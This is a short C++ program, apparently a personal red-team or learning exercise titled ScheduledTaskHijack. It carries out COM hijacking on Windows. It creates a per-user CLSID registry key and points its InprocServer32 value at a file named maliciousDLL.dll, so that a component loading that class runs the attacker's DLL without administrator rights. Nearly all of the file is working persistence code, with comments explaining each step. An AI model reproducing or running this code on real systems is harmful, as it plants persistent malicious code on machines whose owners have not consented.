// ScheduledTaskHijack.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <taskschd.h>
#include <comutil.h>
#pragma comment(lib, "comsuppw.lib")

#pragma comment(lib, "taskschd.lib")

int main(int argc, char** argv)
{

     HKEY hKey;
     LPCWSTR subkey = L"SOFTWARE\\Classes\\CLSID\\{A6BA00FE-40E8-477C-B713-C64A14F18ADB}\\InprocServer32";
     // we need to add the subkey "{A6BA00FE-40E8-477C-B713-C64A14F18ADB}" followed by the "InprocServer32" subkey and finally the key value for InprocServer32
     // by using RegCreateKeyEx, we can achieve this
     LONG regStatus = RegCreateKeyEx(HKEY_CURRENT_USER, subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);

     if (regStatus == ERROR_SUCCESS) {
          // Key created successfully
          std::wcout << L"Subkey created successfully.\n";
          // Close the key
          RegCloseKey(hKey);
     }
     else {
          // Failed to create the key
          std::wcout << L"Failed to create subkey. Error code: " << regStatus << L"\n";
          return 0;
     }
     
     const wchar_t* subKey = L"SOFTWARE\\Classes\\CLSID\\{A6BA00FE-40E8-477C-B713-C64A14F18ADB}\\InprocServer32";
     const wchar_t* valueName = L"";

     // open the registry key
     LONG openResult = RegOpenKeyExW(HKEY_CURRENT_USER, subKey, 0, KEY_SET_VALUE, &hKey);
     if ( openResult == ERROR_SUCCESS) {
          const wchar_t* newValue = L"C:/Users/wenqi/Desktop/maliciousDLL.dll";
          
          // set the registry value
          LONG setResult = RegSetValueExW(hKey, valueName, 0, REG_SZ, reinterpret_cast<const BYTE*>(newValue), (wcslen(newValue) + 1) * sizeof(wchar_t));
          if ( setResult == ERROR_SUCCESS) {
               std::wcout << L"Registry default value updated successfully." << std::endl;
          }
          else {
               std::wcout << L"Failed to update registry default value. Error code: " << setResult << std::endl;
          }

          RegCloseKey(hKey);
     }
     else {
          std::wcout << L"Failed to open registry key. Error code: " << openResult << std::endl;
     }

     return 0;

}
